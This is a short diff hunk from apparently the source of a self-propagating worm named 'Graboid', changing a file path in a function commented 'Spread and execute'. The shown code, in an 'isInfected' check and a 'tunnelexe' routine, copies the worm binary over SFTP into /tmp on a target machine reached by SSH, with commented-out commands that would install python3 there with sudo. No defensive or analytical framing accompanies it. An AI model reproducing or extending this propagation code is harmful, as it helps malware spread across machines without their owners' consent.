@@ -83,7 +83,7 @@ def isInfected():
 #Spread and execute
 def tunnelexe(sshTGT, sftpTGT):
     try:
-        sftpTGT.put(TGT_file("Graboid" ), "/tmp/" + "Graboid")
+        sftpTGT.put(TGT_file("./Graboid"), "/tmp/" + "Graboid")
         
         # sshTGT.exec_command("sudo apt-get -y install python3")
         # sshTGT.exec_command("sudo apt-get -y install python3-pip")
